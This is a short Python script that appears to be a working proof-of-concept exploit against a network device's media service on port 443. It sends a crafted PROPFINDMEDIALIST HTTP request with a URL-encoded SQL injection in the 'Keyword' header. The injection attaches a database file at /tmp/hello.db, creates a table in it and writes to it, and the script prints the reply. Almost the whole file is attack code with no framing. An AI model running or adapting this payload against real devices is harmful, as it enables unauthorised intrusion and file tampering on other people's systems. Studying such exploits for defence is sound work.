#!/usr/bin/env python
"""
"""
from socket import *
import ssl


host='192.168.50.1'
port=443


sock_=socket(AF_INET,SOCK_STREAM)
sock = ssl.wrap_socket(sock_,ca_certs="server.crt",cert_reqs=ssl.CERT_NONE)
sock.connect((host,port))
sock.settimeout(2)

v='a\' OR 1);attach database "/tmp/hello.db" as tt;create table tt.ff (foo INT);insert into tt.ff values (0);--'
v=v.replace(' ','%20')
v=v.replace('\'','%27')

s='PROPFINDMEDIALIST /favicon.ico HTTP/1.1\r\n'
s+='Host: %s\r\n' % host
s+='User-Agent: Mozilla\r\n'
s+='Keyword: %s\r\n' % v
s+='MediaType: 1\r\n'
s+='Start: 0\r\n'
s+='End: 1\r\n'
s+='Orderby: TITLE\r\n'
s+='Orderrule: ASC\r\n'
s+='Parentid: 1\r\n'
s+='\r\n'
sock.write(s)

data=''
while 1:
    try:
        s=sock.read()
    except:
        s=''
    if len(s)<1:
        break
    data+=s
print  data

